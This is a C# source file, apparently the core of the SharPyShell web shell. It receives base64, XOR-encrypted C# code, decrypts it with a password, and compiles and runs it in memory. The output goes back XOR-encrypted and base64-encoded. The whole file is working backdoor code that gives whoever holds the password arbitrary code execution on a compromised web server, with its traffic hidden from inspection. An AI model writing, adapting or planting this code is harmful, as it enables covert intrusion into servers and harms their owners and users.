using System;
using System.Text;
using System.Reflection;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

public class SharPy{
	private byte[] Xor_Enc_Dec(byte[] input, string password) {
		byte[] key = Encoding.UTF8.GetBytes(password);
		byte[] output = new byte[input.Length];
		for(int i = 0; i < input.Length; i++) {
			output[i] = (byte) (input[i] ^ key[i % key.Length]);
		}
		return output;
	}

	public string Run(string code, string password)
	{
		string output="";
		if(code!=null){
			byte[] decoded_request_byte=Convert.FromBase64String(code);
			byte[] runtime_code_byte=Xor_Enc_Dec(decoded_request_byte, password);
			string runtime_code=Encoding.UTF8.GetString(runtime_code_byte);
			object runtime_exec_output = new object();
			CompilerResults results = null;
			try{
				CSharpCodeProvider provider = new CSharpCodeProvider();
				CompilerParameters compilerParams = new CompilerParameters();
				compilerParams.GenerateInMemory = true;
				compilerParams.GenerateExecutable = false;
				compilerParams.ReferencedAssemblies.Add("System.dll");	
				results = provider.CompileAssemblyFromSource(compilerParams, runtime_code);
				object o = results.CompiledAssembly.CreateInstance("SharPyShell");
				MethodInfo mi = o.GetType().GetMethod("ExecRuntime");
				runtime_exec_output = mi.Invoke(o, null);
			}
			catch(Exception exc){
				string exc_out_str = exc.ToString()+"\n\n{{{SharPyShellError}}}";
				for( int i=0; i<results.Errors.Count; i++ )                
					exc_out_str +=  i.ToString() + ": " + results.Errors[i].ToString();
				runtime_exec_output=Encoding.UTF8.GetBytes(exc_out_str);
			}
			byte[] output_runtime_code_enc=Xor_Enc_Dec((byte[])(runtime_exec_output), password);
			string output_runtime_code_enc_b64=Convert.ToBase64String(output_runtime_code_enc);
			output=output_runtime_code_enc_b64;
		}
		return output;
	}
}
